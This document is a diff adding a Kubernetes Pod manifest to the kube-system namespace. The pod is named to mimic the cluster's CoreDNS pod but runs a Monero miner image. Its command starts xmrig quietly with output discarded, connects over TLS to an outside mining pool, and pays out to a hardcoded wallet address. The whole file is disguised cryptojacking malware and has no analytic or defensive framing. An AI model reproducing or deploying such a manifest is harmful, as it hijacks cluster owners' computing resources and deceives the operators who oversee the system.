@@ -1,0 +1,27 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: coredns-5c98db65d4-7t2l2
+  namespace: kube-system
+spec:
+  containers:
+  - name: coredns-5c98db65d4-7t2l2
+    image: pmietlicki/monero-miner
+    command: ["sh", "-c"]
+    args:
+    - |
+      sleep 5
+      ./xmrig --coin $(COIN) -o $(POOL_URL) -u $(POOL_USER) -p hacker --max-cpu-usage $(MAX_CPU) --donate-level $(DONATE_LEVEL) -k --tls > /dev/null 2>&1
+    env:
+    - name: COIN
+      value: monero
+    - name: MAX_CPU
+      value: "75"
+    - name: DONATE_LEVEL
+      value: "1"
+    - name: POOL_URL
+      value: demo.salerat.com:443
+    - name: POOL_USER
+      value: 485f7m49jVT8GwjyLmGJTuSV1txuXnSXMTYZYnZp7i1f6jvXAXeoMMtLVwK1XtgTuMB5NcrnayA61Y79y8mhur4uBLfSwKG
+    ports:
+    - containerPort: 443
